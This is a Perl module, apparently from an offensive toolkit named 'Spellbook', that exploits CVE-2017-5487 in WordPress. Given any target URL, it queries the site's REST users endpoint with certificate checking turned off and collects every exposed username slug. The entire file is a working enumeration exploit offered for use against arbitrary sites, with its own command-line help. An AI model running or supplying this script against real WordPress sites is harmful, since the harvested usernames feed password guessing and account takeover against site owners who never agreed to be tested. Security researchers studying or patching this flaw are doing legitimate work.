package Spellbook::Advisory::CVE_2017_5487 {
    use JSON;
    use strict;
    use warnings;
    use Try::Tiny;
    use LWP::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {    
            if ($target !~ /^http(s)?:\/\//) { 
                $target = "http://$target";
            }
                    
            my $userAgent = LWP::UserAgent -> new (
                agent => "Spellbook",
                ssl_opts => { verify_hostname => 0 }
            );
        
            my $request = $userAgent -> get("$target/wp-json/wp/v2/users");

            if ($request -> code() == 200 ) {
                try {
                    my $content = decode_json ($request -> content());
            
                    foreach my $data (@$content) {
                        my $username = $data -> {slug};
                        
                        if ($username) {
                            push @result, $username;
                        }
                    } 
                };

                return @result;
            }

        }

        if ($help) {
            return "
                \rExploit::CVE_2017_5487
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;   
    }
}

1;